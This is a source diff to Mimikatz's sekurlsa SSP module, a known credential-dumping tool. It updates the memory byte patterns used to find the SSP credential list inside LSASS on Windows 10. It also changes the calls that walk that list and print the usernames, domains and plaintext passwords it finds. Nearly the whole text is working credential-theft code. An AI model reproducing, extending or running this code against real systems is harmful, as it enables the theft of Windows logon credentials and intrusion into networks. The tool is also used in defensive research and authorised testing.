@@ -1,18 +1,18 @@
 /*	Benjamin DELPY `gentilkiwi`
 	http://blog.gentilkiwi.com
 	benjamin@gentilkiwi.com
-	Licence : http://creativecommons.org/licenses/by/3.0/fr/
+	Licence : https://creativecommons.org/licenses/by/4.0/
 */
 #include "kuhl_m_sekurlsa_ssp.h"
 
 #ifdef _M_X64
 BYTE PTRN_WIN5_SspCredentialList[]	= {0xc7, 0x43, 0x24, 0x43, 0x72, 0x64, 0x41, 0xff, 0x15};
 BYTE PTRN_WIN6_SspCredentialList[]	= {0xc7, 0x47, 0x24, 0x43, 0x72, 0x64, 0x41, 0x48, 0x89, 0x47, 0x78, 0xff, 0x15};
-BYTE PTRN_WIN81_SspCredentialList[]	= {0x0f, 0xb6, 0xc0, 0x85, 0xc0, 0x75};
+BYTE PTRN_WIN10_SspCredentialList[]	= {0xc7, 0x46, 0x24, 0x43, 0x72, 0x64, 0x41, 0xff, 0x15};
 KULL_M_PATCH_GENERIC SspReferences[] = {
 	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WIN5_SspCredentialList),	PTRN_WIN5_SspCredentialList},	{0, NULL}, {16}},
 	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WIN6_SspCredentialList),	PTRN_WIN6_SspCredentialList},	{0, NULL}, {20}},
-	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WIN81_SspCredentialList),	PTRN_WIN81_SspCredentialList},	{0, NULL}, {13}},
+	{KULL_M_WIN_BUILD_10,		{sizeof(PTRN_WIN10_SspCredentialList),	PTRN_WIN10_SspCredentialList},	{0, NULL}, {16}},
 };
 #elif defined _M_IX86
 BYTE PTRN_WALL_SspCredentialList[]	= {0x1c, 0x43, 0x72, 0x64, 0x41, 0xff, 0x15};
@@ -38,7 +38,7 @@ void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_ssp(IN PKIWI_BASIC_SECURITY_LO
 	KULL_M_MEMORY_ADDRESS aBuffer = {&mesCredentials, &hBuffer}, aLsass = {NULL, pData->cLsass->hLsassMem};
 	ULONG monNb = 0;
 
-	if(kuhl_m_sekurlsa_ssp_package.Module.isInit || kuhl_m_sekurlsa_utils_search_generic(pData->cLsass, &kuhl_m_sekurlsa_ssp_package.Module, SspReferences, ARRAYSIZE(SspReferences), (PVOID *) &SspCredentialList, NULL, NULL))
+	if(kuhl_m_sekurlsa_ssp_package.Module.isInit || kuhl_m_sekurlsa_utils_search_generic(pData->cLsass, &kuhl_m_sekurlsa_ssp_package.Module, SspReferences, ARRAYSIZE(SspReferences), (PVOID *) &SspCredentialList, NULL, NULL, NULL))
 	{
 		aLsass.address = SspCredentialList;
 		if(kull_m_memory_copy(&aBuffer, &aLsass, sizeof(LIST_ENTRY)))
@@ -48,10 +48,10 @@ void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_ssp(IN PKIWI_BASIC_SECURITY_LO
 			{
 				if(kull_m_memory_copy(&aBuffer, &aLsass, sizeof(KIWI_SSP_CREDENTIAL_LIST_ENTRY)))
 				{
-					if(RtlEqualLuid(pData->LogonId, &mesCredentials.LogonId) && (mesCredentials.credentials.UserName.Buffer || mesCredentials.credentials.Domaine.Buffer || mesCredentials.credentials.Password.Buffer))
+					if(SecEqualLuid(pData->LogonId, &mesCredentials.LogonId) && (mesCredentials.credentials.UserName.Buffer || mesCredentials.credentials.Domaine.Buffer || mesCredentials.credentials.Password.Buffer))
 					{
 						kprintf(L"\n\t [%08x]", monNb++);
-						kuhl_m_sekurlsa_genericCredsOutput(&mesCredentials.credentials, pData->LogonId, KUHL_SEKURLSA_CREDS_DISPLAY_SSP | KUHL_SEKURLSA_CREDS_DISPLAY_DOMAIN);
+						kuhl_m_sekurlsa_genericCredsOutput(&mesCredentials.credentials, pData, KUHL_SEKURLSA_CREDS_DISPLAY_SSP | KUHL_SEKURLSA_CREDS_DISPLAY_DOMAIN);
 					}
 					aLsass.address = mesCredentials.Flink;
 				}
